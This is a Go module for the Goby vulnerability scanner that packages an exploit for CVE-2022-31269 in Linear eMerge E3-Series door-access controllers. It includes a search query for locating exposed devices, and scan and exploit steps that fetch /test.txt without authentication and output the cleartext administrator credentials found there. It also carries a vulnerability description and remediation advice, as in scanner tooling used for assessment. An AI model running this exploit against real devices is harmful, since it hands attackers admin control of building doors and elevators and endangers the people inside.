package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "eMerge E3-Series Information Disclosure (CVE-2022-31269)",
    "Description": "<p>Nortek Control Linear eMerge E3-Series is an access control controller from Nortek Control Company in the United States. You can specify which doors people can use to get in and out of a specified location at a specified time.</p><p>Nortek Control Linear eMerge E3-Series has a security vulnerability that stems from the fact that administrative credentials are present in clear text in /test.txt, which allows an unauthenticated attacker to obtain administrative credentials to access the administrative dashboard and control the entire building doors, elevators, etc.</p>",
    "Product": "Linear eMerge E3-Series",
    "Homepage": "https://linear-solutions.com",
    "DisclosureDate": "2022-08-10",
    "Author": "abszse",
    "FofaQuery": "title=\"Linear eMerge\"",
    "GobyQuery": "title=\"Linear eMerge\"",
    "Level": "2",
    "Impact": "<p>Nortek Control Linear eMerge E3-Series has a security vulnerability that stems from the fact that administrative credentials are present in clear text in /test.txt, which allows an unauthenticated attacker to obtain administrative credentials to access the administrative dashboard and control the entire building doors, elevators, etc.</p>",
    "Recommendation": "<p>1. At present, the manufacturer has not released a repair measure to solve this security problem. It is recommended that users who use this software pay attention to the manufacturer's homepage or the reference website at any time to obtain the solution: <a href=\"https://linear-solutions.com.\">https://linear-solutions.com.</a> 2. Delete the test.txt file.</p>",
    "References": [
        "https://packetstormsecurity.com/files/167990/Nortek-Linear-eMerge-E3-Series-Credential-Disclosure.html"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.txt",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "ID=",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Password=",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.txt",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Password=",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "ID=",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        "CVE-2022-31269"
    ],
    "CNNVD": [
        "CNNVD-202208-2451"
    ],
    "CNVD": [],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "eMerge E3-Series 信息泄漏 (CVE-2022-31269)",
            "Product": "Linear eMerge E3-Series",
            "Description": "<p>Nortek Control Linear eMerge E3-Series是美国Nortek Control公司的一种门禁控制器。可指定人员在指定时间可以使用哪些门进出指定地点。<br></p><p>Nortek Control Linear eMerge E3-Series 存在安全漏洞，该漏洞源于管理凭据以明文形式存在于/test.txt中，这导致未经身份验证的攻击者获取到管理凭据以访问管理仪表盘进而控制整个建筑的门、电梯等。<br></p>",
            "Recommendation": "<p>1、目前厂商暂未发布修复措施解决此安全问题，建议使用此软件的用户随时关注厂商主页或参考网址以获取解决办法：<a href=\"https://linear-solutions.com\">https://linear-solutions.com</a>。2、删除test.txt文件。<br></p>",
            "Impact": "<p>Nortek Control Linear eMerge E3-Series 存在安全漏洞，该漏洞源于管理凭据以明文形式存在于/test.txt中，这导致未经身份验证的攻击者获取到管理凭据以访问管理仪表盘进而控制整个建筑的门、电梯等。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "eMerge E3-Series Information Disclosure (CVE-2022-31269)",
            "Product": "Linear eMerge E3-Series",
            "Description": "<p>Nortek Control Linear eMerge E3-Series is an access control controller from Nortek Control Company in the United States. You can specify which doors people can use to get in and out of a specified location at a specified time.<br></p><p>Nortek Control Linear eMerge E3-Series has a security vulnerability that stems from the fact that administrative credentials are present in clear text in /test.txt, which allows an unauthenticated attacker to obtain administrative credentials to access the administrative dashboard and control the entire building doors, elevators, etc.<br></p>",
            "Recommendation": "<p>1. At present, the manufacturer has not released a repair measure to solve this security problem. It is recommended that users who use this software pay attention to the manufacturer's homepage or the reference website at any time to obtain the solution: <a href=\"https://linear-solutions.com.\">https://linear-solutions.com.</a> 2. Delete the test.txt file.<br></p>",
            "Impact": "<p>Nortek Control Linear eMerge E3-Series has a security vulnerability that stems from the fact that administrative credentials are present in clear text in /test.txt, which allows an unauthenticated attacker to obtain administrative credentials to access the administrative dashboard and control the entire building doors, elevators, etc.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10698"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}